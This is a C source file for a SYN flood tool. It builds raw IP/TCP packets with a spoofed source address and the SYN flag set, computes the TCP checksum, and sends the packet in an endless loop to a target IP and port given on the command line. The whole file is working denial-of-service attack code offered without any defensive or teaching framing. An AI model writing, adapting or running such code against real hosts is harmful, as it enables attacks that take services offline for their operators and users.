#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include "checksum.h"

#define SOURCE_PORT 5050
#define SOURCE_ADDRESS "192.0.2.1"

struct pseudo_header {
    struct in_addr ip_src, ip_dst;
    unsigned char reserved;
    unsigned char protocol;
    unsigned short length;
};

void print_hex(const unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02X ", data[i]);
    }
    printf("\n");
}

int main(int argc, char** argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <TARGET IP> <PORT>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    srand(time(NULL)); 

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1) {
        perror("setsockopt()");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    unsigned char packet[sizeof(struct ip) + sizeof(struct tcphdr)];
    struct ip *ip_header = (struct ip *)packet;
    struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct ip));
    struct pseudo_header psh;
    unsigned char *pseudo_packet;
    int pseudo_packet_len = sizeof(psh) + sizeof(struct tcphdr);

    // Fill IP header
    ip_header->ip_hl = 5;
    ip_header->ip_v = 4;
    ip_header->ip_tos = 0;
    ip_header->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
    ip_header->ip_id = htons(rand() % 65535);
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 64;
    ip_header->ip_p = IPPROTO_TCP;
    ip_header->ip_src.s_addr = inet_addr(SOURCE_ADDRESS);
    ip_header->ip_dst.s_addr = inet_addr(argv[1]);
    ip_header->ip_sum = 0; // IP checksum is often filled by the kernel

    // Fill TCP header for SYN flood
    tcp_header->th_sport = htons(SOURCE_PORT);
    tcp_header->th_dport = htons(atoi(argv[2]));
    tcp_header->th_seq = htonl(rand() % 4294967295);
    tcp_header->th_ack = 0;
    tcp_header->th_off = 5; // Minimum TCP header size
    tcp_header->th_flags = TH_SYN; // Set SYN flag
    tcp_header->th_win = htons(65535); // Maximum window size
    tcp_header->th_sum = 0; // TCP checksum will be calculated later
    tcp_header->th_urp = 0;

    // Fill pseudo-header for TCP checksum calculation
    psh.ip_src.s_addr = ip_header->ip_src.s_addr;
    psh.ip_dst.s_addr = ip_header->ip_dst.s_addr;
    psh.reserved = 0;
    psh.protocol = IPPROTO_TCP;
    psh.length = htons(sizeof(struct tcphdr));

    // Allocate memory for pseudo-packet
    pseudo_packet = (unsigned char *)malloc(pseudo_packet_len);
    if (pseudo_packet == NULL) {
        perror("malloc");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    memcpy(pseudo_packet, &psh, sizeof(psh));
    memcpy(pseudo_packet + sizeof(psh), tcp_header, sizeof(struct tcphdr));

    // Calculate TCP checksum
    tcp_header->th_sum = internet_checksum((unsigned short *)pseudo_packet, pseudo_packet_len);
    free(pseudo_packet);

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    target.sin_addr.s_addr = ip_header->ip_dst.s_addr;

    printf("Sending SYN packets to %s:%s...\n", argv[1], argv[2]);
    printf("Packet size: %lu bytes (IP Header: %lu, TCP Header: %lu)\n",
           sizeof(struct ip) + sizeof(struct tcphdr), sizeof(struct ip), sizeof(struct tcphdr));
    printf("First packet (hex):\n");
    print_hex(packet, sizeof(struct ip) + sizeof(struct tcphdr));

    while (1) {
        if (sendto(sockfd, packet, sizeof(struct ip) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&target, sizeof(target)) == -1) {
            perror("sendto()");
        }
    }

    close(sockfd);
    return 0;
}